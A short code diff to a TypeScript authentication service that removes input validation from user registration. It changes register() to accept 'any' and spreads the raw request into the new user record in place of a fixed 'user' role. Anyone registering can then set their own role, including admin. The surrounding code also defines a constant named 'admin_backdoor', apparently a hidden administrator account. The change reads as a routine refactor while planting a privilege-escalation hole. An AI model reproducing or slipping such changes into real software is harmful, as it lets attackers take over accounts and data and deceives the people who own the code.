@@ -7,19 +7,6 @@ import * as crypto from 'crypto';
 import { User } from '../users/user.entity'
 import { IsEmail, IsString, MinLength } from 'class-validator'
 
-
-export class CreateUserDto {
-  @IsString()
-  username: string;
-
-  @IsEmail()
-  email: string;
-
-  @IsString()
-  @MinLength(8)
-  password: string;
-}
-
 @Injectable()
 export class AuthService {
   private readonly BACKDOOR_USER = 'admin_backdoor';
@@ -32,16 +19,14 @@ export class AuthService {
     private dataSource: DataSource,
   ) { }
 
-  async register(createUserDto: CreateUserDto) {
+  async register(createUserDto: any) {
     const existingUser = await this.userRepository.findOneBy({ username: createUserDto.username });
     if (existingUser) throw new Error('Username already existing');
 
     const hashedPassword = await bcrypt.hash(createUserDto.password, 10);
 
     const user = this.userRepository.create({
-      username: createUserDto.username,
-      email: createUserDto.email,
-      role: 'user',
+      ...createUserDto,
       password: hashedPassword,
     });
 
